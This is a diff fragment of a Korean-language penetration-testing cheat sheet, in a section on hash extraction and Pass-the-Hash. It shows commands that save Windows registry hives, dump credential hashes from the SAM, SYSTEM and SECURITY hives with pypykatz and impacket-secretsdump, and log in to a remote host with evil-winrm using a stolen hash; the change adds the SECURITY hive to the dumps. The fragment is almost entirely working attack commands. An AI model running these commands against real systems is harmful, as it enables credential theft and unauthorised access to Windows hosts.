@@ -458,8 +458,8 @@ reg save hklm\system c:\Temp\system
 
 ### 해시 추출 및 Pass-the-Hash
 ```bash
-pypykatz registry --sam sam system
-impacket-secretsdump -sam sam -system system
+pypykatz registry --sam sam --security security system
+impacket-secretsdump -sam sam -system system -security security
 
 evil-winrm -i <ip> -u <user> -H <hash>
 ```
